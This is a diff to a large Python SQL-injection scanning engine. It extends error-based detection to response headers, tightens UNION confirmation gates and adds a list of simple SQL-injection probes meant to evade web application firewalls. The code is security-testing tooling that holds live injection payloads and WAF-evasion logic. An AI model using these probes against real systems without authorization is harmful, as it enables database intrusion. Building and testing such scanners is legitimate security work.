@@ -116687,13 +116687,36 @@ class TechniqueCascadeEngine:
                             param, original + det.payload, self.tamper_chain)
                         _ec2 = await self._safe_confirm(method, url, data, data_fmt,
                             param, original, self.tamper_chain)
-                        if _ef2 and _ef2.body and _ec2:
+                        # FIX-ESNIFF-NONBODY: For non-body surfaces (header/cookie/json/xml/
+                        # path/bg), DBMS error text appears in response HEADERS rather than
+                        # the body.  Allow the check to proceed when _ef2 has headers (even
+                        # if _ef2.body is empty) and also scan those headers for error patterns.
+                        _is_nonbody_surf_sniff = data_fmt in (
+                            "header", "cookie", "json", "xml", "path", "bg")
+                        _ef2_has_content = bool(
+                            _ef2 and (
+                                _ef2.body
+                                or (_is_nonbody_surf_sniff
+                                    and getattr(_ef2, 'headers', None))
+                            )
+                        )
+                        if _ef2_has_content and _ec2:
                             # BUG-FIX-3: Safe decode operation
                             _eb2 = ""
                             try:
                                 _eb2 = _safe_decode_body(_ef2).lower()
                             except (UnicodeDecodeError, AttributeError, TypeError):
                                 _eb2 = "" # Fallback
+                            # FIX-ESNIFF-NONBODY: Also append response headers to scanned text
+                            # for non-body surfaces so error patterns in headers are detected.
+                            if _is_nonbody_surf_sniff:
+                                try:
+                                    _ef2_hdr_items = list(
+                                        (getattr(_ef2, 'headers', None) or {}).items())
+                                    _eb2 += " " + " ".join(
+                                        f"{_hk}:{_hv}" for _hk, _hv in _ef2_hdr_items).lower()
+                                except Exception:
+                                    pass
                             # BUG-FIX-3: Safe decode operation
                             _cb2 = ""
                             try:
@@ -116701,6 +116724,16 @@ class TechniqueCascadeEngine:
                                         if _ec2 and hasattr(_ec2, 'body') and _ec2.body else "")
                             except (UnicodeDecodeError, AttributeError, TypeError):
                                 _cb2 = "" # Fallback
+                            # FIX-ESNIFF-NONBODY: Also scan clean response headers for baseline
+                            # subtraction so we don't count static header patterns as new errors.
+                            if _is_nonbody_surf_sniff:
+                                try:
+                                    _ec2_hdr_items = list(
+                                        (getattr(_ec2, 'headers', None) or {}).items())
+                                    _cb2 += " " + " ".join(
+                                        f"{_hk}:{_hv}" for _hk, _hv in _ec2_hdr_items).lower()
+                                except Exception:
+                                    pass
                             _errpats = ["you have an error", "ora-0", "sqlstate", "syntax error",
                                         "sqlite3.operationalerror", "incorrect syntax",
                                         "unclosed quotation", "error 1064", "updatexml",
@@ -117035,7 +117068,14 @@ class TechniqueCascadeEngine:
                                     # Preconfirmed detections now always carry 1.0 confidence,
                                     # so this gate passes for all legitimate preconfirmations.
                                     getattr(det, '_fp_guards_confidence', 0.0) >= 1.0)
-                if _fp_preconf_gate or _det_conf_gate >= 0.90:
+                # FIX-UH-GATEBYPASS: For UNION techniques (U/UE/UH), the gate-kill bypass is
+                # NOT safe: UNION detection requires sentinel reflection proof, which the bypass
+                # skips entirely.  For U/UE/UH, fall through to _post_confirm_verify_locked where
+                # _sentinel_pass guards every confirmation path.  Boolean/Error/Timing techniques
+                # have no sentinel requirement, so they may use the high-confidence bypass.
+                _is_union_bypass_tech = (_effective_tech in ("U", "UE", "UH")
+                                         or tech in ("U", "UE", "UH"))
+                if (_fp_preconf_gate or _det_conf_gate >= 0.90) and not _is_union_bypass_tech:
                     print(f"  [RDF-CORR] Gate killed but detection confidence={_det_conf_gate:.3f} "
                           f"fp_preconfirmed={_fp_preconf_gate} is very high — "
                           "escalating without body-diff PCV (WAF gate kill does not invalidate "
@@ -120488,6 +120528,46 @@ class TechniqueCascadeEngine:
                             f"deterministic Set-Cookie change vs canary: "
                             f"'{_cookie_structural_note}', "
                             f"absent from baseline {_bl_status})")
+                # FIX-HTTP500-SIMPLE-DISCRIMINATOR: When all stronger upgrade paths fail,
+                # attempt a WAF-friendly simple SQL probe ('AND '1'='1'-- -) that avoids
+                # CAST/CONVERT/FROM DUAL keywords which valid_discriminator probes use.
+                # If the simple probe returns non-500 while error payloads all returned 500,
+                # the server differentiates between valid and invalid SQL expressions —
+                # proving semantic SQL evaluation without WAF-heavy syntax.
+                # Upgrade to http500_x2_simple_discriminator (self-corroborating).
+                _simple_disc = False
+                _simple_disc_status = None
+                try:
+                    _simple_probes_sd = [
+                        "' AND '1'='1'-- -",
+                        "' AND 1=1-- -",
+                        " AND 1=1-- -",
+                        "') AND ('1'='1'-- -",
+                    ]
+                    for _sp in _simple_probes_sd:
+                        _sfp, _, _simple_disc_status, _ = await _pcv_send(_sp)
+                        if _sfp is not None:
+                            break
+                    if (_simple_disc_status is not None
+                            and _simple_disc_status not in (400, 403, 406, 429, 500, 502, 503)
+                            and _status_500_count >= 2):
+                        _simple_disc = True
+                        print(f"[*]     Check C HTTP-500 + simple-SQL discriminator: "
+                              f"{_status_500_count} error payloads → 500, simple valid SQL → "
+                              f"{_simple_disc_status} (non-error) — DB evaluates SQL: errors trigger "
+                              "500 but simple valid SQL succeeds; upgraded to simple_discriminator",
+                              flush=True)
+                    elif _simple_disc_status is not None:
+                        print(f"[*]     Check C HTTP-500 simple-SQL discriminator: simple probe → "
+                              f"{_simple_disc_status} — no differential (WAF blocks simple SQL too); "
+                              "falling to plain http500_x2", flush=True)
+                except Exception:
+                    pass
+                if _simple_disc:
+                    return True, "http500_x2_simple_discriminator", "http_500_simple_discriminator", \
+                           (f" (HTTP 500 on {_status_500_count} error payloads, simple valid SQL → "
+                            f"{_simple_disc_status} non-error — semantic SQL evaluation confirmed, "
+                            f"absent from baseline {_bl_status})")
                 # Plain http500_x2 fallback — weakest signal: error-SQL → 500, canary → non-500,
                 # but no boolean differential, no SQL-universal pattern, no WAF asymmetry, no
                 # size discrimination.  Cannot rule out WAF keyword-blocking or input-validation
@@ -120533,7 +120613,15 @@ class TechniqueCascadeEngine:
         # silently discarded. Fix: run the E-fast path regardless of baseline status;
         # when _bl_fetch_ok=False skip only the baseline-subtraction (`p not in _e_bl_body_chk`)
         # and accept any error-pattern match in fp_true.body as sufficient confirmation.
-        if tech in ("E", "EH") and fp_true and fp_true.body:
+        # FIX-E-FAST-NONBODY: For non-body surfaces (header/cookie/json/xml/path/bg),
+        # DBMS error text appears in response HEADERS rather than the body.  Allow the
+        # E-fast path when fp_true has response headers (even if fp_true.body is empty),
+        # and include those headers in the pattern-match corpus.
+        _e_fast_nonbody = data_fmt in ("header", "cookie", "json", "xml", "path", "bg")
+        _e_fast_eligible = (tech in ("E", "EH") and fp_true and
+                            (fp_true.body or
+                             (_e_fast_nonbody and getattr(fp_true, 'headers', None))))
+        if _e_fast_eligible:
             try:
                 _e_err_patterns = {
                     "MySQL": ["you have an error in your sql syntax","check the manual that corresponds to your mysql server version",
@@ -120574,7 +120662,26 @@ class TechniqueCascadeEngine:
                     "SQLite": ["sqlite3.operationalerror:","sqlite3_prepare","unrecognized token:","sqlitejdbc"],
                 }.get(dbms, ["you have an error in your sql syntax","error","sqlstate[","ora-","sqlite3.operationalerror"])
                 _e_fp_body = _safe_decode_body(fp_true, encoding="utf-8", errors='replace', func_name='extraction_fp_true').lower()
+                # FIX-E-FAST-NONBODY: For non-body surfaces, also scan response headers for
+                # DBMS error patterns.  Use raw .items() to avoid Set-Cookie value collapse.
+                if _e_fast_nonbody:
+                    try:
+                        _e_fp_hdr_items = list((getattr(fp_true, 'headers', None) or {}).items())
+                        _e_fp_body += " " + " ".join(
+                            f"{_hk}:{_hv}" for _hk, _hv in _e_fp_hdr_items).lower()
+                    except Exception:
+                        pass
                 _e_bl_body_chk = _bl_body if _bl_fetch_ok else ""  # FIX-4-REQ3: no baseline = skip subtraction
+                # FIX-E-FAST-NONBODY: Also add baseline headers to the subtraction corpus so
+                # static header patterns that exist in both injection and clean responses are
+                # not counted as confirmation.
+                if _e_fast_nonbody and _bl_fetch_ok and _bl_fp is not None:
+                    try:
+                        _e_bl_hdr_items = list((getattr(_bl_fp, 'headers', None) or {}).items())
+                        _e_bl_body_chk += " " + " ".join(
+                            f"{_hk}:{_hv}" for _hk, _hv in _e_bl_hdr_items).lower()
+                    except Exception:
+                        pass
                 # FIX-4-REQ3: When _e_bl_body_chk="" (baseline unavailable), accept any pattern match
                 # in fp_true as confirmation — "p not in ''" is always True, which is correct
                 # (we cannot subtract baseline we don't have, so any pattern hit is accepted).
@@ -121817,6 +121924,11 @@ class TechniqueCascadeEngine:
                                           "http500_x2_waf_asymmetric",
                                           "http500_x2_sql_universal",
                                           "http500_x2_valid_discriminator",
+                                          # http500_x2_simple_discriminator: WAF-friendly simple
+                                          # SQL probe ('AND '1'='1') returns non-500 while error
+                                          # payloads → 500, proving DB semantic evaluation without
+                                          # heavy CAST/CONVERT syntax. Self-corroborating.
+                                          "http500_x2_simple_discriminator",
                                           # BUG-CORROBORATION-MISSING-HDR-METHOD FIX:
                                           # http500_x2_hdr_error proves DBMS error text is present
                                           # in response headers — self-corroborating (no extra
